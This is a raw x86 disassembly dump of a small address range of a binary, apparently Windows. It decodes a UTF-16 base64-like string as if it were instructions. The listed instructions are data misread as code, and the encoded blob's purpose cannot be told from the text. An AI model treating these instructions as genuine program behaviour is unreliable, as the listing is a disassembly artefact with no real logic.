  40a0ca:	63 00                	arpl   %eax,(%eax)
  40a0cc:	31 00                	xor    %eax,(%eax)
  40a0ce:	7a 00                	jp     0x40a0d0
  40a0d0:	42                   	inc    %edx
  40a0d1:	00 41 00             	add    %al,0x0(%ecx)
  40a0d4:	45                   	inc    %ebp
  40a0d5:	00 55 00             	add    %dl,0x0(%ebp)
  40a0d8:	37                   	aaa
  40a0d9:	00 79 00             	add    %bh,0x0(%ecx)
  40a0dc:	70 00                	jo     0x40a0de
  40a0de:	46                   	inc    %esi
  40a0df:	00 36                	add    %dh,(%esi)
  40a0e1:	00 46 00             	add    %al,0x0(%esi)
  40a0e4:	52                   	push   %edx
  40a0e5:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40a0e9:	00 6e 00             	add    %ch,0x0(%esi)
  40a0ec:	78 00                	js     0x40a0ee
  40a0ee:	4c                   	dec    %esp
  40a0ef:	00 49 00             	add    %cl,0x0(%ecx)
  40a0f2:	63 00                	arpl   %eax,(%eax)
  40a0f4:	32 00                	xor    (%eax),%al
  40a0f6:	53                   	push   %ebx
  40a0f7:	00 70 00             	add    %dh,0x0(%eax)
  40a0fa:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0fb:	00 6b 00             	add    %ch,0x0(%ebx)
  40a0fe:	56                   	push   %esi
  40a0ff:	00 4c 00 63          	add    %cl,0x63(%eax,%eax,1)
  40a103:	00 38                	add    %bh,(%eax)
  40a105:	00 4f 00             	add    %cl,0x0(%edi)
  40a108:	4d                   	dec    %ebp
  40a109:	00 33                	add    %dh,(%ebx)
  40a10b:	00 77 00             	add    %dh,0x0(%edi)
  40a10e:	67 00 6f 00          	add    %ch,0x0(%bx)
  40a112:	51                   	push   %ecx
  40a113:	00 2f                	add    %ch,(%edi)
  40a115:	00 78 00             	add    %bh,0x0(%eax)
  40a118:	4f                   	dec    %edi
  40a119:	00 4a 00             	add    %cl,0x0(%edx)
  40a11c:	35 00 62 00 50       	xor    $0x50006200,%eax
  40a121:	00 6f 00             	add    %ch,0x0(%edi)
  40a124:	74 00                	je     0x40a126
  40a126:	64 00 2b             	add    %ch,%fs:(%ebx)
  40a129:	00 37                	add    %dh,(%edi)
  40a12b:	00 6c 00 34          	add    %ch,0x34(%eax,%eax,1)
  40a12f:	00 46 00             	add    %al,0x0(%esi)
  40a132:	76 00                	jbe    0x40a134
  40a134:	72 00                	jb     0x40a136
  40a136:	35 00 62 00 6f       	xor    $0x6f006200,%eax
  40a13b:	00 6a 00             	add    %ch,0x0(%edx)
  40a13e:	4e                   	dec    %esi
  40a13f:	00 59 00             	add    %bl,0x0(%ecx)
  40a142:	39 00                	cmp    %eax,(%eax)
  40a144:	30 00                	xor    %al,(%eax)
  40a146:	2b 00                	sub    (%eax),%eax
  40a148:	49                   	dec    %ecx
  40a149:	00 52 00             	add    %dl,0x0(%edx)
  40a14c:	74 00                	je     0x40a14e
  40a14e:	72 00                	jb     0x40a150
  40a150:	31 00                	xor    %eax,(%eax)
  40a152:	55                   	push   %ebp
  40a153:	00 67 00             	add    %ah,0x0(%edi)
  40a156:	55                   	push   %ebp
  40a157:	00 6e 00             	add    %ch,0x0(%esi)
  40a15a:	38 00                	cmp    %al,(%eax)
  40a15c:	5a                   	pop    %edx
  40a15d:	00 37                	add    %dh,(%edi)
  40a15f:	00 49 00             	add    %cl,0x0(%ecx)
  40a162:	6e                   	outsb  %ds:(%esi),(%dx)
  40a163:	00 2b                	add    %ch,(%ebx)
  40a165:	00 52 00             	add    %dl,0x0(%edx)
  40a168:	4e                   	dec    %esi
  40a169:	00 4b 00             	add    %cl,0x0(%ebx)
  40a16c:	70 00                	jo     0x40a16e
  40a16e:	6d                   	insl   (%dx),%es:(%edi)
  40a16f:	00 57 00             	add    %dl,0x0(%edi)
  40a172:	70 00                	jo     0x40a174
  40a174:	41                   	inc    %ecx
  40a175:	00 75 00             	add    %dh,0x0(%ebp)
  40a178:	74 00                	je     0x40a17a
  40a17a:	42                   	inc    %edx
  40a17b:	00 37                	add    %dh,(%edi)
  40a17d:	00 49 00             	add    %cl,0x0(%ecx)
  40a180:	75 00                	jne    0x40a182
  40a182:	37                   	aaa
  40a183:	00 70 00             	add    %dh,0x0(%eax)
  40a186:	61                   	popa
  40a187:	00 49 00             	add    %cl,0x0(%ecx)
  40a18a:	73 00                	jae    0x40a18c
  40a18c:	2b 00                	sub    (%eax),%eax
  40a18e:	57                   	push   %edi
  40a18f:	00 62 00             	add    %ah,0x0(%edx)
  40a192:	6d                   	insl   (%dx),%es:(%edi)
  40a193:	00 31                	add    %dh,(%ecx)
  40a195:	00 6e 00             	add    %ch,0x0(%esi)
  40a198:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  40a19b:	00 53 00             	add    %dl,0x0(%ebx)
  40a19e:	4c                   	dec    %esp
  40a19f:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
  40a1a3:	00 32                	add    %dh,(%edx)
  40a1a5:	00 47 00             	add    %al,0x0(%edi)
  40a1a8:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  40a1ac:	48                   	dec    %eax
  40a1ad:	00 59 00             	add    %bl,0x0(%ecx)
  40a1b0:	55                   	push   %ebp
  40a1b1:	00 41 00             	add    %al,0x0(%ecx)
  40a1b4:	5a                   	pop    %edx
  40a1b5:	00 49 00             	add    %cl,0x0(%ecx)
  40a1b8:	63 00                	arpl   %eax,(%eax)
  40a1ba:	55                   	push   %ebp
  40a1bb:	00 54 00 6d          	add    %dl,0x6d(%eax,%eax,1)
  40a1bf:	00 6a 00             	add    %ch,0x0(%edx)
  40a1c2:	68 00 49 00 77       	push   $0x77004900
  40a1c7:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  40a1cb:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
  40a1cf:	00 33                	add    %dh,(%ebx)
  40a1d1:	00 32                	add    %dh,(%edx)
  40a1d3:	00 67 00             	add    %ah,0x0(%edi)
  40a1d6:	5a                   	pop    %edx
  40a1d7:	00 4b 00             	add    %cl,0x0(%ebx)
  40a1da:	4c                   	dec    %esp
  40a1db:	00 4d 00             	add    %cl,0x0(%ebp)
  40a1de:	47                   	inc    %edi
  40a1df:	00 6a 00             	add    %ch,0x0(%edx)
  40a1e2:	42                   	inc    %edx
  40a1e3:	00 2f                	add    %ch,(%edi)
  40a1e5:	00 46 00             	add    %al,0x0(%esi)
  40a1e8:	70 00                	jo     0x40a1ea
  40a1ea:	74 00                	je     0x40a1ec
  40a1ec:	69 00 2f 00 37 00    	imul   $0x37002f,(%eax),%eax
  40a1f2:	69 00 46 00 53 00    	imul   $0x530046,(%eax),%eax
  40a1f8:	66 00 30             	data16 add %dh,(%eax)
  40a1fb:	00 39                	add    %bh,(%ecx)
  40a1fd:	00 43 00             	add    %al,0x0(%ebx)
  40a200:	6c                   	insb   (%dx),%es:(%edi)
  40a201:	00 46 00             	add    %al,0x0(%esi)
  40a204:	6e                   	outsb  %ds:(%esi),(%dx)
  40a205:	00 49 00             	add    %cl,0x0(%ecx)
  40a208:	41                   	inc    %ecx
  40a209:	00 6e 00             	add    %ch,0x0(%esi)
  40a20c:	34 00                	xor    $0x0,%al
  40a20e:	47                   	inc    %edi
  40a20f:	00 45 00             	add    %al,0x0(%ebp)
  40a212:	4f                   	dec    %edi
  40a213:	00 55 00             	add    %dl,0x0(%ebp)
  40a216:	58                   	pop    %eax
  40a217:	00 55 00             	add    %dl,0x0(%ebp)
  40a21a:	6a 00                	push   $0x0
  40a21c:	39 00                	cmp    %eax,(%eax)
  40a21e:	7a 00                	jp     0x40a220
  40a220:	62 00                	bound  %eax,(%eax)
  40a222:	75 00                	jne    0x40a224
  40a224:	44                   	inc    %esp
  40a225:	00 66 00             	add    %ah,0x0(%esi)
  40a228:	55                   	push   %ebp
  40a229:	00 4f 00             	add    %cl,0x0(%edi)
  40a22c:	59                   	pop    %ecx
  40a22d:	00 43 00             	add    %al,0x0(%ebx)
  40a230:	2f                   	das
  40a231:	00 67 00             	add    %ah,0x0(%edi)
  40a234:	31 00                	xor    %eax,(%eax)
  40a236:	74 00                	je     0x40a238
  40a238:	4d                   	dec    %ebp
  40a239:	00 55 00             	add    %dl,0x0(%ebp)
  40a23c:	68 00 44 00 72       	push   $0x72004400
  40a241:	00 62 00             	add    %ah,0x0(%edx)
  40a244:	6d                   	insl   (%dx),%es:(%edi)
  40a245:	00 2f                	add    %ch,(%edi)
  40a247:	00 77 00             	add    %dh,0x0(%edi)
  40a24a:	7a 00                	jp     0x40a24c
  40a24c:	4e                   	dec    %esi
  40a24d:	00 67 00             	add    %ah,0x0(%edi)
  40a250:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40a254:	73 00                	jae    0x40a256
  40a256:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40a25a:	39 00                	cmp    %eax,(%eax)
  40a25c:	63 00                	arpl   %eax,(%eax)
  40a25e:	51                   	push   %ecx
  40a25f:	00 68 00             	add    %ch,0x0(%eax)
  40a262:	4e                   	dec    %esi
  40a263:	00 4d 00             	add    %cl,0x0(%ebp)
  40a266:	61                   	popa
  40a267:	00 73 00             	add    %dh,0x0(%ebx)
  40a26a:	6a 00                	push   $0x0
  40a26c:	58                   	pop    %eax
  40a26d:	00 39                	add    %bh,(%ecx)
  40a26f:	00 33                	add    %dh,(%ebx)
  40a271:	00 46 00             	add    %al,0x0(%esi)
  40a274:	76 00                	jbe    0x40a276
  40a276:	4e                   	dec    %esi
  40a277:	00 75 00             	add    %dh,0x0(%ebp)
  40a27a:	38 00                	cmp    %al,(%eax)
  40a27c:	69 00 4a 00 64 00    	imul   $0x64004a,(%eax),%eax
  40a282:	4f                   	dec    %edi
  40a283:	00 37                	add    %dh,(%edi)
  40a285:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40a289:	00 6d 00             	add    %ch,0x0(%ebp)
  40a28c:	5a                   	pop    %edx
  40a28d:	00 78 00             	add    %bh,0x0(%eax)
  40a290:	67 00 44 00          	add    %al,0x0(%si)
  40a294:	38 00                	cmp    %al,(%eax)
  40a296:	6e                   	outsb  %ds:(%esi),(%dx)
  40a297:	00 31                	add    %dh,(%ecx)
  40a299:	00 68 00             	add    %ch,0x0(%eax)
  40a29c:	41                   	inc    %ecx
  40a29d:	00 79 00             	add    %bh,0x0(%ecx)
  40a2a0:	52                   	push   %edx
  40a2a1:	00 74 00 46          	add    %dh,0x46(%eax,%eax,1)
  40a2a5:	00 48 00             	add    %cl,0x0(%eax)
  40a2a8:	52                   	push   %edx
  40a2a9:	00 30                	add    %dh,(%eax)
  40a2ab:	00 48 00             	add    %cl,0x0(%eax)
  40a2ae:	51                   	push   %ecx
  40a2af:	00 39                	add    %bh,(%ecx)
  40a2b1:	00 76 00             	add    %dh,0x0(%esi)
  40a2b4:	6c                   	insb   (%dx),%es:(%edi)
  40a2b5:	00 6b 00             	add    %ch,0x0(%ebx)
  40a2b8:	2f                   	das
  40a2b9:	00 4a 00             	add    %cl,0x0(%edx)
  40a2bc:	46                   	inc    %esi
  40a2bd:	00 70 00             	add    %dh,0x0(%eax)
  40a2c0:	75 00                	jne    0x40a2c2
  40a2c2:	5a                   	pop    %edx
  40a2c3:	00 39                	add    %bh,(%ecx)
  40a2c5:	00 56 00             	add    %dl,0x0(%esi)
  40a2c8:	4f                   	dec    %edi
  40a2c9:	00 66 00             	add    %ah,0x0(%esi)
  40a2cc:	50                   	push   %eax
  40a2cd:	00 6e 00             	add    %ch,0x0(%esi)
  40a2d0:	44                   	inc    %esp
  40a2d1:	00 4e 00             	add    %cl,0x0(%esi)
  40a2d4:	68 00 42 00 69       	push   $0x69004200
  40a2d9:	00 41 00             	add    %al,0x0(%ecx)
  40a2dc:	61                   	popa
  40a2dd:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  40a2e1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a2e4:	6b 00 38             	imul   $0x38,(%eax),%eax
  40a2e7:	00 51 00             	add    %dl,0x0(%ecx)
  40a2ea:	47                   	inc    %edi
  40a2eb:	00 50 00             	add    %dl,0x0(%eax)
  40a2ee:	58                   	pop    %eax
  40a2ef:	00 38                	add    %bh,(%eax)
  40a2f1:	00 73 00             	add    %dh,0x0(%ebx)
  40a2f4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2f5:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  40a2f9:	00 65 00             	add    %ah,0x0(%ebp)
  40a2fc:	46                   	inc    %esi
  40a2fd:	00 36                	add    %dh,(%esi)
  40a2ff:	00 52 00             	add    %dl,0x0(%edx)
  40a302:	31 00                	xor    %eax,(%eax)
  40a304:	61                   	popa
  40a305:	00 37                	add    %dh,(%edi)
  40a307:	00 73 00             	add    %dh,0x0(%ebx)
  40a30a:	70 00                	jo     0x40a30c
  40a30c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a30d:	00 51 00             	add    %dl,0x0(%ecx)
  40a310:	62 00                	bound  %eax,(%eax)
  40a312:	63 00                	arpl   %eax,(%eax)
  40a314:	77 00                	ja     0x40a316
  40a316:	57                   	push   %edi
  40a317:	00 63 00             	add    %ah,0x0(%ebx)
  40a31a:	47                   	inc    %edi
  40a31b:	00 58 00             	add    %bl,0x0(%eax)
  40a31e:	47                   	inc    %edi
  40a31f:	00 73 00             	add    %dh,0x0(%ebx)
  40a322:	4d                   	dec    %ebp
  40a323:	00 56 00             	add    %dl,0x0(%esi)
  40a326:	49                   	dec    %ecx
  40a327:	00 72 00             	add    %dh,0x0(%edx)
  40a32a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a32b:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  40a32f:	00 4f 00             	add    %cl,0x0(%edi)
  40a332:	34 00                	xor    $0x0,%al
  40a334:	55                   	push   %ebp
  40a335:	00 61 00             	add    %ah,0x0(%ecx)
  40a338:	74 00                	je     0x40a33a
  40a33a:	45                   	inc    %ebp
  40a33b:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  40a33f:	00 4f 00             	add    %cl,0x0(%edi)
  40a342:	70 00                	jo     0x40a344
  40a344:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40a348:	4f                   	dec    %edi
  40a349:	00 59 00             	add    %bl,0x0(%ecx)
  40a34c:	58                   	pop    %eax
  40a34d:	00 45 00             	add    %al,0x0(%ebp)
  40a350:	4b                   	dec    %ebx
  40a351:	00 55 00             	add    %dl,0x0(%ebp)
  40a354:	31 00                	xor    %eax,(%eax)
  40a356:	51                   	push   %ecx
  40a357:	00 4f 00             	add    %cl,0x0(%edi)
  40a35a:	52                   	push   %edx
  40a35b:	00 50 00             	add    %dl,0x0(%eax)
  40a35e:	50                   	push   %eax
  40a35f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a362:	43                   	inc    %ebx
  40a363:	00 52 00             	add    %dl,0x0(%edx)
  40a366:	73 00                	jae    0x40a368
  40a368:	6d                   	insl   (%dx),%es:(%edi)
  40a369:	00 56 00             	add    %dl,0x0(%esi)
  40a36c:	74 00                	je     0x40a36e
  40a36e:	61                   	popa
  40a36f:	00 37                	add    %dh,(%edi)
  40a371:	00 69 00             	add    %ch,0x0(%ecx)
  40a374:	2b 00                	sub    (%eax),%eax
  40a376:	33 00                	xor    (%eax),%eax
  40a378:	70 00                	jo     0x40a37a
  40a37a:	79 00                	jns    0x40a37c
  40a37c:	4f                   	dec    %edi
  40a37d:	00 33                	add    %dh,(%ebx)
  40a37f:	00 55 00             	add    %dl,0x0(%ebp)
  40a382:	38 00                	cmp    %al,(%eax)
  40a384:	70 00                	jo     0x40a386
  40a386:	38 00                	cmp    %al,(%eax)
  40a388:	62 00                	bound  %eax,(%eax)
  40a38a:	50                   	push   %eax
  40a38b:	00 68 00             	add    %ch,0x0(%eax)
  40a38e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a38f:	00 4e 00             	add    %cl,0x0(%esi)
  40a392:	73 00                	jae    0x40a394
  40a394:	52                   	push   %edx
  40a395:	00 6a 00             	add    %ch,0x0(%edx)
  40a398:	53                   	push   %ebx
  40a399:	00 32                	add    %dh,(%edx)
  40a39b:	00 73 00             	add    %dh,0x0(%ebx)
  40a39e:	37                   	aaa
  40a39f:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  40a3a3:	00 47 00             	add    %al,0x0(%edi)
  40a3a6:	39 00                	cmp    %eax,(%eax)
  40a3a8:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40a3ac:	4e                   	dec    %esi
  40a3ad:	00 4b 00             	add    %cl,0x0(%ebx)
  40a3b0:	45                   	inc    %ebp
  40a3b1:	00 52 00             	add    %dl,0x0(%edx)
  40a3b4:	38 00                	cmp    %al,(%eax)
  40a3b6:	2f                   	das
  40a3b7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a3ba:	41                   	inc    %ecx
  40a3bb:	00 67 00             	add    %ah,0x0(%edi)
  40a3be:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  40a3c2:	30 00                	xor    %al,(%eax)
  40a3c4:	32 00                	xor    (%eax),%al
  40a3c6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3c7:	00 48 00             	add    %cl,0x0(%eax)
  40a3ca:	66 00 35 00 42 00 6c 	data16 add %dh,0x6c004200
  40a3d1:	00 61 00             	add    %ah,0x0(%ecx)
  40a3d4:	66 00 38             	data16 add %bh,(%eax)
  40a3d7:	00 78 00             	add    %bh,0x0(%eax)
  40a3da:	38 00                	cmp    %al,(%eax)
  40a3dc:	52                   	push   %edx
  40a3dd:	00 42 00             	add    %al,0x0(%edx)
  40a3e0:	45                   	inc    %ebp
  40a3e1:	00 7a 00             	add    %bh,0x0(%edx)
  40a3e4:	35 00 6e 00 4e       	xor    $0x4e006e00,%eax
  40a3e9:	00 56 00             	add    %dl,0x0(%esi)
  40a3ec:	78 00                	js     0x40a3ee
  40a3ee:	78 00                	js     0x40a3f0
  40a3f0:	54                   	push   %esp
  40a3f1:	00 76 00             	add    %dh,0x0(%esi)
  40a3f4:	75 00                	jne    0x40a3f6
  40a3f6:	45                   	inc    %ebp
  40a3f7:	00 4a 00             	add    %cl,0x0(%edx)
  40a3fa:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3fb:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  40a3ff:	00 66 00             	add    %ah,0x0(%esi)
  40a402:	6f                   	outsl  %ds:(%esi),(%dx)
  40a403:	00 47 00             	add    %al,0x0(%edi)
  40a406:	71 00                	jno    0x40a408
  40a408:	36 00 74 00 6a       	add    %dh,%ss:0x6a(%eax,%eax,1)
  40a40d:	00 58 00             	add    %bl,0x0(%eax)
  40a410:	54                   	push   %esp
  40a411:	00 30                	add    %dh,(%eax)
  40a413:	00 56 00             	add    %dl,0x0(%esi)
  40a416:	4e                   	dec    %esi
  40a417:	00 2b                	add    %ch,(%ebx)
  40a419:	00 66 00             	add    %ah,0x0(%esi)
  40a41c:	4b                   	dec    %ebx
  40a41d:	00 37                	add    %dh,(%edi)
  40a41f:	00 7a 00             	add    %bh,0x0(%edx)
  40a422:	47                   	inc    %edi
  40a423:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  40a427:	00 6d 00             	add    %ch,0x0(%ebp)
  40a42a:	53                   	push   %ebx
  40a42b:	00 43 00             	add    %al,0x0(%ebx)
  40a42e:	6d                   	insl   (%dx),%es:(%edi)
  40a42f:	00 53 00             	add    %dl,0x0(%ebx)
  40a432:	64 00 32             	add    %dh,%fs:(%edx)
  40a435:	00 4e 00             	add    %cl,0x0(%esi)
  40a438:	57                   	push   %edi
  40a439:	00 57 00             	add    %dl,0x0(%edi)
  40a43c:	78 00                	js     0x40a43e
  40a43e:	51                   	push   %ecx
  40a43f:	00 43 00             	add    %al,0x0(%ebx)
  40a442:	2b 00                	sub    (%eax),%eax
  40a444:	4e                   	dec    %esi
  40a445:	00 45 00             	add    %al,0x0(%ebp)
  40a448:	4e                   	dec    %esi
  40a449:	00 50 00             	add    %dl,0x0(%eax)
  40a44c:	75 00                	jne    0x40a44e
  40a44e:	4f                   	dec    %edi
  40a44f:	00 52 00             	add    %dl,0x0(%edx)
  40a452:	70 00                	jo     0x40a454
  40a454:	51                   	push   %ecx
  40a455:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40a459:	00 48 00             	add    %cl,0x0(%eax)
  40a45c:	74 00                	je     0x40a45e
  40a45e:	30 00                	xor    %al,(%eax)
  40a460:	66 00 43 00          	data16 add %al,0x0(%ebx)
  40a464:	34 00                	xor    $0x0,%al
  40a466:	33 00                	xor    (%eax),%eax
  40a468:	2b 00                	sub    (%eax),%eax
  40a46a:	6a 00                	push   $0x0
  40a46c:	66 00 64 00 48       	data16 add %ah,0x48(%eax,%eax,1)
  40a471:	00 37                	add    %dh,(%edi)
  40a473:	00 4e 00             	add    %cl,0x0(%esi)
  40a476:	45                   	inc    %ebp
  40a477:	00 38                	add    %bh,(%eax)
  40a479:	00 39                	add    %bh,(%ecx)
  40a47b:	00 31                	add    %dh,(%ecx)
  40a47d:	00 76 00             	add    %dh,0x0(%esi)
  40a480:	77 00                	ja     0x40a482
  40a482:	76 00                	jbe    0x40a484
  40a484:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  40a488:	71 00                	jno    0x40a48a
  40a48a:	4c                   	dec    %esp
  40a48b:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  40a48f:	00 41 00             	add    %al,0x0(%ecx)
  40a492:	47                   	inc    %edi
  40a493:	00 79 00             	add    %bh,0x0(%ecx)
  40a496:	52                   	push   %edx
  40a497:	00 4f 00             	add    %cl,0x0(%edi)
  40a49a:	48                   	dec    %eax
  40a49b:	00 38                	add    %bh,(%eax)
  40a49d:	00 77 00             	add    %dh,0x0(%edi)
  40a4a0:	34 00                	xor    $0x0,%al
  40a4a2:	66 00 30             	data16 add %dh,(%eax)
  40a4a5:	00 4c 00 34          	add    %cl,0x34(%eax,%eax,1)
  40a4a9:	00 41 00             	add    %al,0x0(%ecx)
  40a4ac:	58                   	pop    %eax
  40a4ad:	00 49 00             	add    %cl,0x0(%ecx)
  40a4b0:	34 00                	xor    $0x0,%al
  40a4b2:	37                   	aaa
  40a4b3:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  40a4b7:	00 42 00             	add    %al,0x0(%edx)
  40a4ba:	72 00                	jb     0x40a4bc
  40a4bc:	6a 00                	push   $0x0
  40a4be:	77 00                	ja     0x40a4c0
  40a4c0:	77 00                	ja     0x40a4c2
  40a4c2:	4e                   	dec    %esi
  40a4c3:	00 73 00             	add    %dh,0x0(%ebx)
  40a4c6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4c7:	00 33                	add    %dh,(%ebx)
  40a4c9:	00 71 00             	add    %dh,0x0(%ecx)
  40a4cc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4cd:	00 75 00             	add    %dh,0x0(%ebp)
  40a4d0:	45                   	inc    %ebp
  40a4d1:	00 6a 00             	add    %ch,0x0(%edx)
  40a4d4:	6d                   	insl   (%dx),%es:(%edi)
  40a4d5:	00 79 00             	add    %bh,0x0(%ecx)
  40a4d8:	4b                   	dec    %ebx
  40a4d9:	00 48 00             	add    %cl,0x0(%eax)
  40a4dc:	78 00                	js     0x40a4de
  40a4de:	4f                   	dec    %edi
  40a4df:	00 69 00             	add    %ch,0x0(%ecx)
  40a4e2:	4a                   	dec    %edx
  40a4e3:	00 76 00             	add    %dh,0x0(%esi)
  40a4e6:	4e                   	dec    %esi
  40a4e7:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
  40a4eb:	00 48 00             	add    %cl,0x0(%eax)
  40a4ee:	6a 00                	push   $0x0
  40a4f0:	42                   	inc    %edx
  40a4f1:	00 45 00             	add    %al,0x0(%ebp)
  40a4f4:	6d                   	insl   (%dx),%es:(%edi)
  40a4f5:	00 4e 00             	add    %cl,0x0(%esi)
  40a4f8:	5a                   	pop    %edx
  40a4f9:	00 75 00             	add    %dh,0x0(%ebp)
  40a4fc:	5a                   	pop    %edx
  40a4fd:	00 6b 00             	add    %ch,0x0(%ebx)
  40a500:	32 00                	xor    (%eax),%al
  40a502:	67 00 57 00          	add    %dl,0x0(%bx)
  40a506:	5a                   	pop    %edx
  40a507:	00 75 00             	add    %dh,0x0(%ebp)
  40a50a:	75 00                	jne    0x40a50c
  40a50c:	5a                   	pop    %edx
  40a50d:	00 49 00             	add    %cl,0x0(%ecx)
  40a510:	71 00                	jno    0x40a512
  40a512:	51                   	push   %ecx
  40a513:	00 4d 00             	add    %cl,0x0(%ebp)
  40a516:	66 00 77 00          	data16 add %dh,0x0(%edi)
  40a51a:	69 00 58 00 77 00    	imul   $0x770058,(%eax),%eax
  40a520:	45                   	inc    %ebp
  40a521:	00 72 00             	add    %dh,0x0(%edx)
  40a524:	45                   	inc    %ebp
  40a525:	00 63 00             	add    %ah,0x0(%ebx)
  40a528:	4a                   	dec    %edx
  40a529:	00 62 00             	add    %ah,0x0(%edx)
  40a52c:	6c                   	insb   (%dx),%es:(%edi)
  40a52d:	00 52 00             	add    %dl,0x0(%edx)
  40a530:	44                   	inc    %esp
  40a531:	00 62 00             	add    %ah,0x0(%edx)
  40a534:	51                   	push   %ecx
  40a535:	00 73 00             	add    %dh,0x0(%ebx)
  40a538:	34 00                	xor    $0x0,%al
  40a53a:	70 00                	jo     0x40a53c
  40a53c:	52                   	push   %edx
  40a53d:	00 57 00             	add    %dl,0x0(%edi)
  40a540:	4d                   	dec    %ebp
  40a541:	00 75 00             	add    %dh,0x0(%ebp)
  40a544:	32 00                	xor    (%eax),%al
  40a546:	38 00                	cmp    %al,(%eax)
  40a548:	30 00                	xor    %al,(%eax)
  40a54a:	49                   	dec    %ecx
  40a54b:	00 77 00             	add    %dh,0x0(%edi)
  40a54e:	2b 00                	sub    (%eax),%eax
  40a550:	36 00 57 00          	add    %dl,%ss:0x0(%edi)
  40a554:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40a558:	55                   	push   %ebp
  40a559:	00 63 00             	add    %ah,0x0(%ebx)
  40a55c:	49                   	dec    %ecx
  40a55d:	00 37                	add    %dh,(%edi)
  40a55f:	00 59 00             	add    %bl,0x0(%ecx)
  40a562:	41                   	inc    %ecx
  40a563:	00 57 00             	add    %dl,0x0(%edi)
  40a566:	63 00                	arpl   %eax,(%eax)
  40a568:	55                   	push   %ebp
  40a569:	00 6b 00             	add    %ch,0x0(%ebx)
  40a56c:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  40a570:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  40a573:	00 48 00             	add    %cl,0x0(%eax)
  40a576:	43                   	inc    %ebx
  40a577:	00 66 00             	add    %ah,0x0(%esi)
  40a57a:	53                   	push   %ebx
  40a57b:	00 6a 00             	add    %ch,0x0(%edx)
  40a57e:	6b 00 62             	imul   $0x62,(%eax),%eax
  40a581:	00 31                	add    %dh,(%ecx)
  40a583:	00 70 00             	add    %dh,0x0(%eax)
  40a586:	51                   	push   %ecx
  40a587:	00 57 00             	add    %dl,0x0(%edi)
  40a58a:	6a 00                	push   $0x0
  40a58c:	6a 00                	push   $0x0
  40a58e:	35 00 57 00 6e       	xor    $0x6e005700,%eax
  40a593:	00 4c 00 62          	add    %cl,0x62(%eax,%eax,1)
  40a597:	00 72 00             	add    %dh,0x0(%edx)
  40a59a:	6b 00 57             	imul   $0x57,(%eax),%eax
  40a59d:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
  40a5a1:	00 2f                	add    %ch,(%edi)
  40a5a3:	00 2b                	add    %ch,(%ebx)
  40a5a5:	00 53 00             	add    %dl,0x0(%ebx)
  40a5a8:	5a                   	pop    %edx
  40a5a9:	00 43 00             	add    %al,0x0(%ebx)
  40a5ac:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5ad:	00 61 00             	add    %ah,0x0(%ecx)
  40a5b0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5b1:	00 72 00             	add    %dh,0x0(%edx)
  40a5b4:	79 00                	jns    0x40a5b6
  40a5b6:	52                   	push   %edx
  40a5b7:	00 32                	add    %dh,(%edx)
  40a5b9:	00 4f 00             	add    %cl,0x0(%edi)
  40a5bc:	36 00 30             	add    %dh,%ss:(%eax)
  40a5bf:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a5c2:	55                   	push   %ebp
  40a5c3:	00 50 00             	add    %dl,0x0(%eax)
  40a5c6:	52                   	push   %edx
  40a5c7:	00 79 00             	add    %bh,0x0(%ecx)
  40a5ca:	4e                   	dec    %esi
  40a5cb:	00 36                	add    %dh,(%esi)
  40a5cd:	00 56 00             	add    %dl,0x0(%esi)
  40a5d0:	49                   	dec    %ecx
  40a5d1:	00 6f 00             	add    %ch,0x0(%edi)
  40a5d4:	75 00                	jne    0x40a5d6
  40a5d6:	4c                   	dec    %esp
  40a5d7:	00 7a 00             	add    %bh,0x0(%edx)
  40a5da:	44                   	inc    %esp
  40a5db:	00 6c 00 34          	add    %ch,0x34(%eax,%eax,1)
  40a5df:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  40a5e3:	00 68 00             	add    %ch,0x0(%eax)
  40a5e6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5e7:	00 49 00             	add    %cl,0x0(%ecx)
  40a5ea:	70 00                	jo     0x40a5ec
  40a5ec:	59                   	pop    %ecx
  40a5ed:	00 39                	add    %bh,(%ecx)
  40a5ef:	00 7a 00             	add    %bh,0x0(%edx)
  40a5f2:	2b 00                	sub    (%eax),%eax
  40a5f4:	42                   	inc    %edx
  40a5f5:	00 49 00             	add    %cl,0x0(%ecx)
